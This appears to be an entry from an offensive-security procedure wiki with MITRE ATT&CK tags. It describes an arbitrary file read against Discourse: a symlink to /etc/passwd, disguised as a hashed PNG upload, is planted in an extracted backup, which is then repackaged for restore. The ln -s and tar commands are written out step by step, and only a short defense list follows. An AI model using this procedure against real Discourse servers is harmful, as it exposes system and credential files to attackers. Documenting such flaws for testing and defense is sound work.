---
tags:
  - symlink
  - modification
  - local-file
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/create-symlink-to-sensitive-file]]'
verified: false
platforms:
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Shortcut Modification]]'
updated_at: '2025-12-14T17:30:18.615Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 249d457c-5e7d-49a2-b837-f565502d5cee
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Shortcut Modification]]'
---
# Modify-Backup-with-Symlink

## Summary

This procedure details inserting a symbolic link (symlink) into the extracted Discourse backup's uploads directory, pointing to a sensitive system file like /etc/passwd, to enable arbitrary read after restore.

## Description

The root cause is lack of symlink validation during tar extraction in restore. By placing a symlink in /uploads/default/original/1X/ masquerading as an image, restoration resolves it, allowing web access to the target file. Targets Linux-based Discourse installs; works if server can read the file. Prerequisites: Extracted backup locally.

## Requirements

1. Local Linux/Unix environment with ln and tar commands
2. Extracted backup directory
3. Knowledge of target file path (e.g., /etc/passwd)

## Defense

Defensive measures and detection strategies:

- Implement symlink blocking in tar extraction (e.g., --no-same-owner or custom scripts)
- Scan uploads for symlinks post-restore
- Restrict server process to minimal file permissions

## Objectives

1. Create symlink without breaking backup structure
2. Masquerade as legitimate upload file
3. Repackage for upload

## Instructions

### Step 1: Navigate to Uploads Directory

**Context**: Locate the position for symlink insertion.

cd to extracted_backup/uploads/default/original/1X/

> Expected: Directory listing shows existing files.

### Step 2: Create the Symlink

**Context**: Link to sensitive file using [[commands/create-symlink-to-sensitive-file]].

Execute the command to create the link:

```bash
ln -s /etc/passwd /path/to/extracted/uploads/default/original/1X/7ad2e8f5fe02890f20503044b604e29e6f3718fd.png
```

> Explanation: -s creates symbolic link; target is /etc/passwd; destination mimics a hashed PNG filename. Expected: No output; ls -l confirms link.

### Step 3: Repackage the Backup

**Context**: Compress modified contents.

From backup root: tar -czf modified.tar.gz .

> Expected: New archive created; verify with tar -tzf modified.tar.gz | grep symlink.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[Shortcut Modification]] Shortcut Modification (adapted for symlinks)

### Sub-Techniques


## Commands Used

- [[commands/create-symlink-to-sensitive-file]]

## Tools Used


## Tags

- symlink-creation
- backup-modification
